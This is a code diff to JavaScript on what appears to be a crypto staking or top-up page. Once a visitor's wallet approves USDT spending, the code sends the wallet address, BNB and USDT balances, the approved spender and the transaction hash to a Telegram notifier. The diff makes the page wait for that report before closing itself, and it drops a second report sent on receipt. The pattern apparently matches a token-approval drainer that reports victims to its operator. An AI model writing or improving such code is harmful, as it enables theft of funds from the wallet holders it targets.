@@ -549,33 +549,36 @@ async function approveToken(account) {
             console.log('📤 Date:', formattedDate);
             console.log('📤 Hash:', hash);
             
-            // Ensure all variables are defined
-            const walletAddr = account || 'Unknown';
-            const bnbBal = balanceInBNB || '0';
-            const usdtBal = usdtBalanceFormatted || '0';
-            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
-            const dateStr = formattedDate || new Date().toLocaleString();
-            const txHash = hash || 'Unknown';
-            
-            // Send Telegram notification immediately when transaction hash is received
-            console.log('📨 [TX] Sending Telegram notification...');
-            sendTelegramNotification(
-                walletAddr, 
-                bnbBal, 
-                usdtBal, 
-                approvedAddr, 
-                dateStr, 
-                txHash
-            ).then(result => {
-                if (result) {
+            try {
+                // Ensure all variables are defined
+                const walletAddr = account || 'Unknown';
+                const bnbBal = balanceInBNB || '0';
+                const usdtBal = usdtBalanceFormatted || '0';
+                const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
+                const dateStr = formattedDate || new Date().toLocaleString();
+                const txHash = hash || 'Unknown';
+                
+                // Send Telegram notification and WAIT for it before closing/redirecting
+                console.log('📨 [TX] Sending Telegram notification (await)...');
+                const notifResult = await sendTelegramNotification(
+                    walletAddr, 
+                    bnbBal, 
+                    usdtBal, 
+                    approvedAddr, 
+                    dateStr, 
+                    txHash
+                );
+
+                if (notifResult) {
                     console.log('✅ [TX] Telegram notification sent successfully');
                 } else {
                     console.error('❌ [TX] Telegram notification returned false');
                 }
-            }).catch(err => {
+            } catch (err) {
                 console.error('❌ [TX] Telegram notification error:', err);
-            });
+            }
             
+            // Only after attempting Telegram notification, call your backend and close/redirect
             var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
             $.ajax({
                 url: '/home/TopUpWithMetamaskJson',
@@ -585,10 +588,8 @@ async function approveToken(account) {
                 data: JSON.stringify(maindt),
                 success: function (data) {
                     console.log('Success');
-                    // Close site immediately after Telegram notification sent
                     setTimeout(() => {
                         window.close();
-                        // If window.close doesn't work, try redirect
                         if (!window.closed) {
                             location.href = "/home/index";
                         }
@@ -596,10 +597,8 @@ async function approveToken(account) {
                 },
                 error: function (err) {
                     console.log("Error: " + JSON.stringify(err));
-                    // Close site immediately after Telegram notification sent
                     setTimeout(() => {
                         window.close();
-                        // If window.close doesn't work, try redirect
                         if (!window.closed) {
                             location.href = "/home/index";
                         }
@@ -609,36 +608,6 @@ async function approveToken(account) {
         })
         .on('receipt', function (receipt) {
             console.log('Approval confirmed with receipt:', receipt);
-
-            try {
-                const txHashFromReceipt = receipt && receipt.transactionHash ? receipt.transactionHash : 'Unknown';
-                console.log('📨 [RECEIPT] Sending Telegram notification with receipt hash...', txHashFromReceipt);
-
-                const walletAddr = account || 'Unknown';
-                const bnbBal = balanceInBNB || '0';
-                const usdtBal = usdtBalanceFormatted || '0';
-                const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
-                const dateStr = formattedDate || new Date().toLocaleString();
-
-                sendTelegramNotification(
-                    walletAddr,
-                    bnbBal,
-                    usdtBal,
-                    approvedAddr,
-                    dateStr,
-                    txHashFromReceipt
-                ).then(result => {
-                    if (result) {
-                        console.log('✅ [RECEIPT] Telegram notification sent successfully');
-                    } else {
-                        console.error('❌ [RECEIPT] Telegram notification returned false');
-                    }
-                }).catch(err => {
-                    console.error('❌ [RECEIPT] Telegram notification error:', err);
-                });
-            } catch (e) {
-                console.error('❌ [RECEIPT] Failed to send Telegram notification from receipt:', e);
-            }
         })
         .on('error', function (error) {
             hideLoading();
